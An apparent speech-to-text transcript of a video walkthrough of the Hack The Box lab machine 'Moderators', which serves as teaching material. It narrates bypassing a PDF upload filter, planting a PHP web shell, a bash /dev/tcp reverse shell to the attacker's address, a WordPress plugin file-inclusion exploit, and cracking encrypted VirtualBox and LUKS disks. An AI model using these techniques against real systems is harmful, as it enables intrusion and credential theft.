 what's going on YouTube this is ipsack we're doing moderators from hack the box which has a lot of small challenges in it I don't think anyone in particular is incredibly tough however the tough part is all the enumeration and Recon that goes into this box and knowing how to use the information presented to you it starts off with a hand-built web application for a company to accept vulnerability reports they say you must submit them in PDFs so the challenging part here is knowing to add PDF to extension Brute Force to find some information with that information you can exploit a file upload vulnerability in the web app get a shell on it and then some poking around leads you to another user that has an encrypted vdi image for virtualbox the challenging part here isn't decrypting it or getting the password for it it's actually using the vdi image because virtualbox in order to use this requires you to install an extension once you install the extension it's easy to decrypt the decrypted vdi has a lux encrypted partition so it's double encrypted crack that and then you can get and find the root password so with that being said let's jump in as always we start with the end map so Dash SC for default scripts as V enumerate versions OA I'll put all formats playing the end map director and call it moderators and then the IP address of 1010 11.173 this can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on Port 22 and its Banner tells us it's in Ubuntu Server then we have HTTP on Port 80. it's Banner tells us it's Apache also running on Ubuntu doesn't seem to have that much information in nmap so let's go take a look at the website going to 10 10 11 173 we get a page and based upon this it looks like they're a managed service provider actually managed security provided to be specific because they're talking about security Partners right here but I don't really see too much that's interesting do take note that it is made with love by kavigan and then we have Fred Holly and Jane so these are all potential users on the box um the first thing I generally do before running like a gobuster or something in the background just take a look at the page source to see if I can tell what it's built with if it's like a WordPress thing I'd see WP content just seeing what I see here and all this stuff looks generic and then we have index.phpabout.php contact.php so we know this is some type of PHP web app we don't really see anything that indicates what it's built with uh I'm guessing this is some type of template they're using because we have a comment that does nothing here so they probably just stripped out some code there but nothing too interesting so I'm going to run a therabuster with all the defaults but we'll just specify the PHP extension so we'll do Dash X PHP and then output I'm going to call this uh faribuster.php dot out just to let me know this is a generic therabuster and I did the PHP extension so looking at this we do have a logs directory so I'm going to copy this um I don't know why paste didn't work there let's just navigate to it manually and we just get a blank thing so this directory doesn't look like it does anything yet so let's just go back and we had a few links here so service blog contact about and then Herm goes nowhere so looking at service.php we can see more text and the key thing right here is it's saying please note that all reports and logs must be uploaded in PDF format for security reasons we won't accept any other formats they're the only except PDFs which I find a little bit funny but I mean it's better than accepting a docx or Word documents right so um this looks like just a filler text we go to the next thing we have a Blog here so they're making all the disclosures public and looking at these links uh there's no like um page per blog post it looks like this actually kind of looks wordpressy but it just goes to blog.php so not WordPress we do have reports.php and then question mark report 8121 so we have some type of user input here on this parameter but let's take a look at the rest of the blog we have this one for two two one nothing there another one three four seven eight so what I'm going to do is send this over into prep Suite and then let's see if we have any SQL injection in here we're going to do some light testing real quick so send it in burp Suite go to repeater tab um just send the request and we'll see what the default one looks like and it looks like my favorite bus just slowing down my connection I've been having a lot of like ISP latency issues so I'm just going to kill that so this goes quicker there's not too much that the Go Buster tells us so um looking at this we have 10 072 bytes looks like it's returning a whole page so I just take note of the bytes so we can see what is different I'm going to put a single quote here we have 8081 bytes and going down do we have anything unique I don't really see anything so what I'm going to do is go back to 4221 looking at the page I'm going to search for disclosure information because this comes back on the report and then let's do one that probably doesn't exist like a single quote and we see disclosure information is no longer here so I'm going to put a comment here and let's see if anything changes we still don't have disclosure information so this did not make the SQL query valid trying with a double quote still no matches on that try it with no Quotes no matches so I don't think this is going to be SQL injectable we could try like 4220 plus one to see if we have any type of like ssrf type vulnerability here and it's not processing that because again no disclosure information if we just did four two two one we see one match so we could send this over into SQL map to keep things running in the background while we work but um I know that's not going to get me anywhere so I'm not going to waste your time just running that command um instead let's just go straight to fuff so we can fuzz this and actually before I do that let's create a text file of just um let's do a thousand to 9999 um I guess we can do one to nine nine nine nine so we see like one two three I'm still not getting this disclosure information so let's first do four eye and sequence one through quad nines do Echo I and all that's going to do is print one through quad nines direct this to [Music] um numbers so now I have a file called numbers that has all that so we can do I'll do Dash H because I want to match a word so let's see where is match looks like we can do MW to nope uh Mr for match reg X okay so we'll do fuff Dash U HTTP 10 10 11 173. then we can paste this and then for report we just put fuzz Dash W for word list numbers and then we want to match the regex and then we will paste disclosure information so now this should just hit all the pages testing for like an idor vulnerability I think that's like a indirect object reference to see if we can hit any other reports than the ones listed in the blog I guess we should have taken a look at all these pages to see what the reports look like so we see um domain is censored out this is an open redirect here this is ssrf we're getting potential host names so this one is help.something.hdb so we could potentially do like virtual host fuzzing um we go back to the content there so nothing interesting there back to fuff we have a few so two five eight nine let's take a look at this and it's probably gonna be one we've already seen so Health arcade.io.hdb has a SQL injection we don't know the IP address of this and there's no DNS server so I'm going to ignore this for now uh actually I guess we could test for DNS so nslookup server 10 10 11 173 and then put in this come on wrong clipboard there we go and we don't get a response back and I know nmap didn't say anything about DNS but DNS typically runs on UDP and we didn't scan UDP so that's why I was just testing it so the next one we have is three four seven eight let's take a look at this nothing interesting there go back to fluff I'm going to start the Bottom now 9798 let's paste this and we have something interesting um this one has a logs field remember we had a logs directory but nothing was in that directory so now we have something right so let's go to moderators we can do logs and then this and we just get a big old white page so what I'm going to do is we're going to go Buster on this directory we could do Pharaoh Buster but I generally use fairbuster when I want it to automatically recurse into directories if I just want to go into one directory I still use gobuster I don't know why I changed them up just because I guess I like to be difficult but we'll do go Buster dir the word list um we'll specify opt seclist discovery raft uh was it web content rasmallwords.txt the URL and then the extension I'm going to do the extension PDF because if you're a member back on this service page they say they only accept reports logs and PDF format so let's take a look if there's any PDFs in this directory the other thing that is odd we do see logs.pdf that is good um this is a md5 sum here so I'm just going to refresh this so we can take this piece this E21 and what I'm going to do is go to crackstation because I know crackstation lets me crack md5s and it has a big dictionary I would go over to hashcat but um typically with md5 this will be my first bet and I just want to see if this directory is random or not um I gotta pick all the stupid Vehicles awesome not a robot contrary to what you may think but we do see this md5 sum does crack and the result is 9798 which is interesting because if I go back here we do 9798 this is the report ID So based upon the report ID it generates this directory and this directory also had a logs.pdf of oh I erased everything and went to logs.com that was weird go here white page logs.pdf and it says the logs have been removed but let's go take a look at some other um places so if I look at this W fuzz we have two five eight nine so whoops can't type exit let's do Echo dash n so we don't put a line break two five eight nine md5 sum and we get this so let's copy this change it and see if logs.pdf exists it does and we see log file created for report 2589 submitted uh we have logs uploaded from logs report log upload dot PHP so we have a uh file upload form and guessing so right here if I'll upload and it wants us to upload something right so let's go and create a PHP shell so let's do htb moderators then what I'm going to do is V shell.php and then the first thing I always do when testing PHP is just a simple Echo and then after that we always go and try for code execution right so let's upload shell.php and we can do burp Suite intercept on upload this put it into repeater and then we send it and what do we have we see only PDF files are allowed so what I'm going to do paste that error in and then we're going to play with this real quick so I'm going to change this dot PHP we're going to have dot PDF and see if it does anything it still says only PDF files are allowed uh let's see I can click this gear icon and auto scroll to match so it's not doing it based on my extension maybe mime type I think PDFs are application PDF we still see only PDF files are allowed so I'm going to look at the magic bytes for a PDF real quick so I'm going to just locate Dash RF regex PDF dollar to find every file that ends in PDF and let's just xxd a random PDF pipe it over the head and we can see PDFs begin with percent pdf-1.4 so if I just Echo this to a file and then run file against it it's going to detect it's a PDF based upon the magic bytes so let's try putting the magic bytes here and then hit send and we don't have this error anymore it doesn't say only PDFs are allowed it now says file upload successfully so now the odd thing is it's not giving us any type of um like user like not user ID but a log ID because I expect the logs to go into a directory like log slash whatever but it's just in logs I guess so I'm going to just try hitting logs and then let us do what is it we called it cell.php.pdf and we get file not found so let's go back to our go Buster and I'm just going to actually we can just look at the results here actually no we want to go up one directory so we'll just go to logs and see if there's anything in this directory we have CSS exist and also uploads so let's try logs that uploads shell PHP PDF I'm gonna do I can't view a source I guess um maybe curl this and we'll see what it gives us and we have our PHP code it's not a surprise the server didn't try to execute this because we have the extension as PDF so let's fix that let's remove PDF so it ends in PHP again and only PDF files are allowed let's try putting PDF before the PHP and whoops we don't have any error messages here so let's now hit the new URL pdf.php and we see the PHP code is gone so now let's go and rename this actually if we can just do it in prep Suite to do um system then request CMD and then send this one over and let's go to a browser and was it shell.pdf.php CMD is equal to ID and we still see it just as test so I'm guessing it won't um like overwrite the file if I bet if I go down here we see like file name already exist so let's do shell2.pdf.php change this over and we don't get any output it just says PDF 1.4 which is odd I'm going to try like curl 10 10 14 8. see maybe for some reason this is blind so nclvnp80 sudo send this over and we don't get a hit so the next thing I'm going to do is change this up and instead of doing a system I'm going to do PHP info and we gotta change this to like shell3.php and if we hit shell3.php we have the PHP info page so what I'm going to look for is disabled let's see is it just disable I want to look at like disable functions I don't know if I control F didn't work but we have disable functions right here and let's go and just put it in VI so we can easily read this so paste 10 s comma replace it with backslash r and we can see pass-through system exec and shell exact or disabled so this is why we couldn't do anything because the system command is disabled and it's also worth mentioning generally in disabled functions I'll put PHP info in there as well but we could have also done I want to say let's do um is it Echo ini underscore get disabled underscore functions I want to say this is it let's see what this does real quick shell four paste uh that is not it what is it I think it's just disable functions so let's do five that send then change this to be shell five and we have the functions here so another way to get that piece of code or ran that you wanted um if we go to let's see actrex PHP code execution I'm gonna do system uh what are the other ones that were blocked shell exec and pass through and the reason why I'm putting all the disabled functions is like Google Foo right so if I want to hit the Hat Tricks page that has a list of all the ways PHP can execute code put a few of the disabled ones to help Google know what page you want and then maybe you'll find it so other ways so exact pass-through system shell exec it's doing this F read then P open so let's try this one so let's go back here and we can try pasting this F read P open and what we're going to do is replace bin LS which just request CMD and then what this is going to do p open I think is process open uh specify the process open the handle in read mode so you can read the output and then this F read is going to read it in 4096 bytes so let's try sending this let's name this shell6.php and go back to a web browser shell six CMD is equal to ID and that did not work so you do have an error message here at all well uploaded successfully see what did I screw up shell 6 PDF CMD is equal to ID let's try hard coding this just ID show 7. let's do shell seven view source nothing let's see oh I probably need Echo that's definitely it shell eight I bet if I went to the Hat Tricks page I just did not copy the echo um that one's on me so there we go now we have the output of the ID command we can put this back to be the request put an echo here and I'm just going to call this shell 10 because I forgot where I stopped off CMD is equal to ID awesome let's do you name Linux so this is good let's send this over to burp Suite go here proxy refresh change this over to a post request and I just want to test to make sure I can do arguments I can I wasn't sure because it is p open I didn't know if we had to specify like arguments a different way so let's just do our standard bash reverse shell Dev TCP 10 10 14 8 is my IP 0 and one URL encode this then we can and see lvnp 9001 I don't know where that base64 came from uh bash Dash C dash dash I Dev TCP 10 10 14 8 9001. okay there we go so python3-c import PTY pty.spawn then Dash sdty raw minus Echo FG enter enter export term is equal to X term so now I can clear the screen if I typed it right there we go so the first thing I do whenever I get access to a web server is just poke around the web server see if there's any credentials in it because most of them have some type of database so just looking at the uploads directory we can see all my shell attempts nothing too interesting there uh going up One Directory this is the other files from researchers so I'm just gonna do a find dot dash type f so I can see all the files and let's see there's a few logs.pdf and index.html I'm going to guess this is going to be a size of zero I can do a dash LS flag so it shows me the size as well and let's see index.html size zero so I probably don't have to poke at it um I should have piped that over to last capital S to get rid of line wrapping oh god um that just makes it look even worse maybe um but the main thing I care about is that zero so what I'm going to do if I copy this let's do an and sign then exclamation point paste that in and that gets rid of everything that has size zero and we can see there's nothing too interesting um we could look at the upload function itself and let's see what this looks like uh PHP oh this is gonna be a pain to look at because it's got all the HTML code I hate looking at web apps that are just like um single PHP files and not an actual framework because there's so much bloat to see things um the main thing I care about right now is a database I'm going to grab for 127.001 and don't see anything and the reason why I did that is because the database is probably configured to talk back to itself so um that to me was a safe grip to do we can look for password see if there's anything like that and um don't see that phrase so I'm guessing there's no database here so the next thing I want to look at before I just run a tool like Lin peas is probably see the active users on the machine so I'm going to grep for everything that ends in sh against Etsy past WD and that tells me the users on this box so we have root John and Lexi so you can do a ps-e-f and grep for root and we get a lot of processes so I'm gonna switch that over to John we get no processes I look over at Lexi and we can see there is this user local S Pen startup.sh that looks like it is potentially running this PHP thing I'm just looking at like the parent process thing um so 861 so we can see these are all intertwined uh we could buy do like uh dash dash Forest and we see here's our shell but see the same thing here with that user bin Runner and just shows all the processes so let's take a look at startup.sh so it's cat and paste this in and we see all it does is execute a shell command to run a PHP web server on 127001 port 8080 and it's running opt site.new so let's take a look at opsite.new and we see it is a WordPress website so this looks like it is going to be running as Lexi because we see this PHP thing is underneath Lexi so if I manage to drop a web shell here we should get code execution as Lexi and can see things she does so I'm going to do a fine Dot and then Dash writable to show me all writable files and folders and we get nothing um the next thing I'm going to look at is wpconfig.php because this will have database credentials the thing I was looking for before on the last web server and we get permission denied so I'll do it ls-la so I can look at missions and we see WP config is read write execute by Lexi and members of mod raters so that's groups I look at my group and I'm only www data so there's nothing there we do have some backup file so let's take a look at this so if I got this then let's go back and look for password and username here password here I'm gonna guess this is not the correct credentials um we can just look at the um sample config if I look at this it is the same thing so the next thing I'm going to look at since I have shell here is going to go into the plugins folder of Wordpress to see if there's any like vulnerable plugins so that's in WP content plugins and we can see two folders there is brand folder and password manager so I'm going to go inside of brand folder and um actually let's just search boy for exploits so search brand folder there is a lfi RFI so I'm going to do a dash X so we can examine what this is and let's see the vulnerability occurs in the first line of callback.php and we can see it does require once and then this request thing is getting a user parameter and WP Dash load.php so if we call callback.php specify our WordPress absolute path of a directory we control it will include the file uh WP load of these um wploy is the easiest one because it doesn't have any directories and it gives us a proof of concept right here so what I'm going to do is go back to push shell and let's go let's see where was it I just do CD that then HTML uploads what is it uh logs uploads and I'm going to copy or shell 10 PDF thing over into Dev shm I'm going to use Dev shm for this because of two reasons number one um if the server reboots this file goes away because this is just in memory and number two a lot of services now have like virtual temp directories because of system D so I don't like using slash temp because I may be writing something to slash temp but the service itself has a different temp directory um so let's just rename shell to what was it um I think wp-load.php if I remember right yeah WP Dash load dot PHP and the reason why I'm using this shell and not the um shell I did previously is because we can't use that system Command right um let's see I'm going to modify this and put the reverse shell here because I'm going to put it in a curl request and I don't feel like um escaping everything correctly so we can do bash Dash C then bash Dash I Dev TCP 10 10 14 8 9001 zero and one close both of those and this should just give me a shell so now the next step of the exploit is to hit callback.php and we specify our path so here I'm gonna do nclvnp 9001 and then we can curl this and it's already default to the localhost uh the path is gonna be Dev shm we will oh God my terminal not happy curl HTTP localhost I was gonna say we have to change the port to be 8080. um and the director is not WordPress so if we do this and I spelled Coral correctly one two three like that did it hit no let's see curl brand folder callback I'm gonna do a dash V so we can see and let's see 200 okay I think if I add a trailing slash and it looks like the web server hung and the web server hung because it gave us a shell so what happened there let's go I can just exit this real quick and we can go back to search Point um so there's no trailing slash here so it does WordPress absolute path and then WP load So what had happened here is I did Dev shm and send it put a slash it did wpload.php and of course that doesn't exist so I had to put that slash there for it so run this command again and now we're as Lexi I'm gonna go to Lexi's home directory we kind of the user.text but most importantly um an SSH key and I always like using SSH over virtual because it's just more reliable so I'm going to copy her SSH key and then we can V lexi.id RSA paste this in chmod 600 and then sh Dash I this key Lexi at 10 10 11 173 and it should let us in so here we have SSH the one thing I'm going to do now that we got in is I just want to curl localhost 8080 to make sure the web server works and it's not so what happened is this PHP how it's executing this doesn't look like it's multi-threaded so because I have this shell here I hung up the only web server thread and right now across the web server which not good for anything so whenever you get a shell on a web server always make sure the website is functional I'm going to kill this netcat session and we'll immediately see the web server works again so um Yeah just something to be aware of and maybe this is just slow because still not working and the shell isn't there but um oh well we have SSH as Lexi so now what we can do is go into this site.new folder and get the wpconfig.php file that has the database password and we see it's WordPress user is the username and the password is WordPress password one two three exclamation mark exclamation mark so we could look at the other users on this box I think it was John and try just SEO John with the password we have and we get a password failure um the other thing we have is another plugin in WordPress if we went into plugins there is a password manager plug-in so what I'm going to do is a mysql-u WordPress user Dash p put in the password and then let's take a look at the WordPress database so use WordPress and then let's see show tables and where would a password manager be probably WordPress PMS underscore passwords because that's probably password manager Suite or something like that so I'm going to do a describe on this table and we have pass ID username whatever so I'm going to do select star from this and if we just do a semicolon it outputs I didn't say from outputs everything like on one line and it's hard to read right so instead of semicolon I always do backslash G and it puts it in a more user readable format so we can see pass id6 usernames Carlos and then this user ID looks like a base 64 string so Echo dash n base64-d and it is encrypted so we could probably reverse this encryption or we can just log into the website and see if it tells us the password um I'm going to opt to log into the website first so what I'm going to do is on the very first line of an SSH connection I'm going to type um squigglyc and then that will put me into this SSH prompt and we can say Dash capital L 8080 localhost and I think am I listening on yeah bird Suites listing on port 8080 so let's say um eight thousand and then localhost 8080. and what this is going to do is tell my local box to listen on Port 8000 and any traffic there send it through this SSH connection and on the other end of SSH connection directed to localhost 8080 which is this WordPress site right so if I now take prep Suite off and just do localhost 8000 it's going to say no website exists because I'm not listening on that Port until I hit enter and now I go here and it directed me to localhost 8080 um shoot um let's see I'm just going to disable brip Suite real quick and we'll do the same thing so 8080 localhost 8080. WordPress has this really annoying habit of using like absolute URLs everywhere so um even though I hit the website on localhost 8000 it directed me to localhost 8080. um super annoying and we have this blog it is pretty horribly formatted because all the URLs are using moderators.hdb so if I go into myherist file and say um 127001 is also moderators.hdb then we refresh this page the WordPress post looks a bit better so the key thing we want to do is log in so let's go to wp-admin and we get prompted with username and email we don't know this but we have access to the database through our SSH connection so we can do the same thing and the database or the table is WP users and we can see we have an admin user and a Lexi user what I'm going to do is change admin's password and then log in and then we'll change it back so um let's just Google uh generate WordPress password and then go to one of the websites that lets us do this so password will make is Please Subscribe generate the password hash copy this and then we can say update the wp users table set user underscore pass is equal to or password and then where ID is equal to one so where id1 set this user password so we're going to do this semicolon row changed is one and I'm going to copy this password we could have also tried cracking it but um sometimes I like just changing it real quick I'm going to do admin and then please subscribe login uh yeah Miss emails correct sure once it logs in come on I will change this password back right so we can hit up twice and set the password back because we're logged in we have the cookie we don't need the password anymore um remind me later is that going to work this website is going awfully slow so let's see let's just set this back and see what happens if it eventually logs in uh it logged us out so maybe it's saying the password back right then was not a good idea admin please subscribe so I wonder if changing the password somehow invalidates the cookie I did not think that was the case for WordPress but very well could be um and since this website is so slow maybe we're just gonna go and um switch back to just finding a way to decrypt the password from the information we have oh looks like it finally logged in and we have this PW DMS thing I'm going to click on import export because well that's what we want to do is export passwords so clicking this and then probably wait 10 to 15 seconds for the page to load and here it lets us do a CSV I'm going to click everything and then export data and it says data export successful but it didn't download anything um click that again nothing so I'm going to click on passwords and see what this does um I'm really not sure what that export data button did that's funny but let's check passwords to see if it shows a way for us to see the passwords in this database and if not then this is just a rabbit hole and we'll have to go into the database anyways um the page finally loaded and we see the password is masked but I see this view password button and we have begin SSH key so we have Carl and we get Carl at the best I wonder if this is John actually um let's exit out of the database s u Dash John paste this in authentication failure sudo Dash l put this password for Lexi I don't know what Carl's account is we don't have a curl on the box um maybe it just doesn't have a shell grab Dash I curl Etsy pass WD nothing there but we do have John's SSH key so I'm going to click copy so we copy this to the clipboard and let's get out of here the John dot ID underscore RSA of that's not the clipboard that is and they put everything on one line oh that is annoying um let's see I'm guessing every space should be a new line so let's change space to be backslash backslash n and let's see I just want backslash R probably there we go and then fix this up the end private key and then begin because these just have spaces that looks much better like a key so chmod 600 and then sh Dash I with this key John at 10 10 11 173 which is moderators IP address and we get logged in as John so doing an ls-la we see scripts and stuff um so let's check out what's in Scripts uh a bunch of files and let's go into stuff we have exp sorry let's do LS EXP I don't know what this is let's just take a look at a file uh looks like this is messages but there is a vbox folder so let's look at this and it looks like it's a vdi which is going to be like a virtualbox hard drive or something as a virtualbox because it's introdirectory code vbox and we have vbox it's 116 Megs if I look at this virtualbox file we can kind of get an idea I'm going to use it in dim so we have syntax highlighting and we see it's a machine called moderators it's Ubuntu we have a hard drive that's located at F colon 2019.vdi this is the vdi image we see and it is going to be an encrypted hard drive in virtualbox then we also have a second hard disk this is going to be ubuntu.vdi which we don't see in this directory so there's also a DVD drive um and then just what it is like how many Megs of ram it has and things like that but the first step is going to be getting this um file on our desktop so I'm not going to exit actually let us SCP so scp-i specifier key John at 10 10 11 173 and then we want to go in stuff vbox and copy these files to just a home directory so there we have it it's copying it's going to take a minute or two to download this um image actually it's going to be much quicker so now that it's downloaded we could open this in virtualbox and then get prompted for a password but I want to keep all the virtualbox like self-contained to one part of the video so I'm going to jump ahead since I know it's encrypted and try to find a way to decrypt this hard drive or get the password before we open it up in virtualbox and the main reason is because we have to install a virtualbox extension so there's a few virtual box steps that we have to do um I'm going to first Google hash cat uh virtualbox crack because the first time when or whenever I go to um cracking something hashcaps my first BET right and we can see on the hash cat forms we have some information here and then someone created a pull request so we can look at the pull request and see hashcat does have the features and if we go to files changed and scroll we can see there is going to be a python script called uh that's a module again let's see virtualbox to hashcat so I'm just going to copy this and we can call this vbox to hashcat.pi and set mode paste whoops set mode paste set paste okay that puts us in pasting mode um let's see view file Raw I could probably just W get this right here let's just W get wget oh it's going to IPv6 um I don't think curl does and I could just run this on my box that has it it may actually be um on parrot already but we have the file now so Python 3 V box to hashcat and I'm going to specify the vbox file we have to give it the argument Dash Dash vbox and we get a hash so let's copy this hash and then I'm going to go on a box I call the Kraken because I always hate running hashcat in a VM so we go in the hashcat directory V hashes slash I'll call this moderators.vdi paste it in and then we can just do hashcat uh dot bin put in the file then opt word list rocky.txt and it's going to start in Auto detect mode it should automatically detect the hash and it looks like it is about to start so we see it initializing the runtime um okay well almost starting to crack let's see how fast this goes real quick so I can do s uh how many per second where is it is that up a little bit we can see hash cat running where's the speed oh um 1000 hashes per second so I'm gonna let this run we'll see if it ends up cracking it and after about a minute and a half we see it recovered the password so we can scroll up and see the password is just computer we could also do the dash dash show option and we'll look at its pot file and show us the password but now that we know the password to this vdi we can open this up in virtualbox where it should ask us the password so before I do that let's go into this file itself and the one thing I want to change is where it's loading this vdi image for it's not F colon right we want to put the full path where it is and that's going to be home ipsec hdb moderators um I'm actually going to make the vbox directory and then we can move 2019 to vbox so we just keep everything in a directory let's close this oh I was adding it on the box itself um didn't realize that's where I was so PWD copy this the 2019 0801.vbox f and I know it tells us not to modify this file but um we like to live dangerously right so the path is set there so the next step I'm going to do is just open my home directory let's go to htb moderators vbox and then I'm just going to double click this file and it opens up virtualbox now there is an extension in virtualbox that will have to install to support this encryption I think it's some weird licensing thing so I'm going to do virtual box extension go to Google um let's see is this it Wiki downloads let's see extension pack so we're not on virtualbox 7. if I do let's see help is there about I need six one three two so this is not it older builds six one and then we want to get to 6132 and yours may differ so make sure you grab the one that you want and I'm going to download extension pack so we can save this and it has been downloaded then I can go file preferences extensions actually before I do that let's try powering this machine on right so if I click Start uh we have an error it can't open because it can't find the Ubuntu vdi so let me just go in the settings and we will remove this ubuntu.vdi we just want that 2019 um USB I don't need to enable the controller support there was a CD drive I thought I saw somewhere but I don't see it mounted so that's fine so if I click Start now is it going to ask it just says failed uh cannot open medium oh shoot we already named where that was and it's not changed here right because I look at the details I don't see it in the vbox folder so I'm just going to move2019.vdi up One Directory because I don't feel like adding it in the config so it starts to boot up and then we'll probably get a failure of it not being able to do anything so it should ask us for the password and I think it's going to after we install the extension so a roundabout way just to show the behavior I'm going to install the extension install to the bottom pretending we read that and then install it looks like it has been installed now if I go to start this uh never ask for the password there we go now it asks for a password I'm not going to enter that in what a lot of people did is they boot into an ISO here and then access the vdi what I'm going to use is the vbox manuscript to decrypt it so let's see 2019 vbox it is still pointed at that directory that's fine all I was saying is if this configuration file had home hdb moderators or moderators vbox to see if I had to move that vdi file again so let's do bbox manage and then let's see crap encrypt and this is going to be weird we're going to call encrypt medium but we decrypt it it's it's weird because if you call encrypt medium and just specify the old password then it's just going to decrypt that vdi so um yeah so encrypt medium and then we want to specify The UU ID of the disk so if I go tools media 2019 information we get the uuid here I'm just going to put it in quotes I don't think we have to but better be safe than sorry and then dash dash old password we can either give it a file or a dash I'm going to do Dash because that specifies standard n and it asks us for the password we can do computer and it says it has been completed if we didn't install the the plugin this would actually error saying like um can't read encryption type or something but now we have a decrypted vdi so the next thing to do is Google how to mount vdi and let's see maybe this one this is using p7zip we don't want that um right here so we use qmu NBD so first we do mod probe to create a network block device and what that does is creates like slash Dev NBD zero and if I do file against this we just see block special um there's a file flag I want let's see is it Dash M no preserve data I want dash s when you're doing file against special files you use the dash s flag so it follows it and this by going to say um empty right so right now the block device is empty if we run this sudo qmu Network block device specify the block device that we created and then the vdi it mounts it there so we do this and then 2019.vdi and now I'm going to run this file command again without the dash s and we see it just says it's Network block special if I do the dash s to say yes I know it's a special file it tells us it's a lux encrypted file so now we're dealing with a encrypted hard drive so this is double encrypted and we have to figure out how to decrypt Lux and if we look at hashcad example hashes um let's see we're gonna find out we can't decrypt this with hashcat which is a bit of a pain and the reason why is it is Lux version 2 as file told us and hashcat only supports Lux version one currently say we see all these version ones so instead of using hashcat let's just go to Google and search cracking Lux and it brings us to this blog post from diverto which is a really good one I'd recommend reading it but you can see it's pretty lengthy so I'm not going to go into everything I'm just going to go to the repository he links let's see is this it yes as you can see on his repo he has this  setup PW guess and if we go over here and go to releases he has a static Linux build so we can just copy this and W get it and then chmod plus x uh brute legs static like this and let's see we need to give it the path to the Lux volume so that's going to be Dev mbd0 because that's where we have it mounted and then we want to give it a file so read password from a file uh we can do user share word list then rock you dot text and Dev NBD is not a maybe sudo there we go that looks like it did it I saw oh we don't have permission to access it probably going to be sudo so running the script it's not giving any output is there anything else we needed to do we could have done a few threads let's see I'm going to put the argument first so Dash f there we go using dictionary mode awesome so I was expecting to see a little bit more output but maybe it's setting things up or it doesn't give any type of status let's see we do options beginning a password and a password read from file print progress every n second so we should have done a dash V but we can see it already tried we have the password abc123 so now we have to mount this Lux volume so I'm going to Google Mount Lux volume I know there's like a crypt setup Command right so let's see what is it  setup Lux open so we're going to run this pseudo Crypt setup blocks open the network block device zero and then we specify a name so let's do sudo um Crypt setup Lux open okay my tab autocomplete wasn't working so I was confused uh Dev nbd0 and then we want to name this something I'm going to name it moderators and what this is going to do is map something under Dev mapper so if I do sudo lsla Dev mapper we see it only has control so do this ABC one two three now we have mounted this drive I'm going to do this LS on dev mapper again and we see moderators has been mounted so I can do sudo Mount Dev mapper moderators then slash mount and we go here and now we're in the Lux folder so it has a lost and found in the scripts we look at scripts and we have a lot of files so we could manually look through all these files looking for some type of password or a secret but that's that's going to be a lot right so there are two there's a lot of things I do when I look for passwords the first one is um I just look at entropy of things right so if I look at all in one let's look at ADLs dot PS1 let's see trying to think of the best way to do this so what we want to do is search all variables in this because maybe someone's going to do password is equal to something and generally one variable is a set or strings are set they're inside of quotes with passwords it's generally going to be single quotes because you never want to like worry about escaping things so I'm just going to create a grip to show me everything between single quotes So we do Dash o capital P I don't know exactly what this stands for I just remember it because it's overpowered with all the things you can do I'm going to do a open parenthesis and I'm going to say single quote dot star question mark single quote and what this is going to do is have grep only show us what's in between these parentheses and what we want is something that begins with the single quote can be anything and that ends with a single quote right and I can do Dash R to make this recursive and period and we can see it's showing us every variable here right so now the next thing we want is to not show us file names I think that's Dash no file name and now we have just a list of variables so what we want to do is create a loop so for I in this do Echo I and this is going to be the same thing um let's see or i n why did that fail oh because I said in did not type it so now we have a loop that goes on every single input so I'm going to do X is equal to then we'll go Echo dash n I type it over to ENT and then Echo X so if I do this we can see entropy here right and all we want to do is grab entropy so I'm going to grip for entropy and then I'm going to pipe this into awk and we're going to print the third field so one two three so now when I run this we just have a list of all the entropy of every variable so now my echo I'm going to do Echo X and then space I and now we have entropy and then what the variable of that was so now what we can do is a sort command so we'll do sort dash n and all the phrases that have high entropy will be at the bottom and this just highlights strings um just looking through these looking for one that stands out the best this admin here stands out and this works because um password definitions or password requirements try to make them to be somewhat High entropy um by that what I mean is not repeat characters and they do that with all the substitution things like that so if let's just take a quick step real quick so we look at this so we Echo and then send to entropy we see this is 4.02 um actually before you do that let's look at abc123 and we see it's 2.8 you may think by like putting a capital here and like and at here this may increase the entropy but we see it's still 2.8 because even though these are like wider ranges on like the bit field like the number is higher lower it doesn't really matter because we're not really repeating characters right so in a password you generally have like uppercase um letters symbols things like that and the less it repeats the higher that entropy is going to be so let's say some of those underscores are now dashes we can increase it but because someone's trying to make a stronger password by doing all these random substitutions um we can use entropy to hunt them down right so it's not a bulletproof way but it is a good way to find things another way we could have done this um that I've done in the past is a lot of people when they do pass phrases their habit of separating things with underscores so we can see in this one has a word in all capitals then an underscore and a word and all lowercase I change that e to a three but because they just do that I mean you can attack it with a grep dash E I want to say for regex and we'll just go anything A to Z of one through nine characters then we can separate by an like Dash or underscore then look for A to Z um one to nine characters again something like this and then Dash R for recursive period and the only string that comes in this whole directory is going to be this because it's got the word the then under case best right so you can do a lot of weird regular Expressions to hot passwords or looking at entropy there's a bunch of ways we can do that but this was the way we did we can grab this password and if we go to SSH um let's do we have an sh as John so sudo Dash L paste this in and we can see um we now have John's password so we can run sudo and John may run any command so since we have his password now we can escalate to root so hope you guys enjoyed that and that'll be the video take care and I'll see you all next time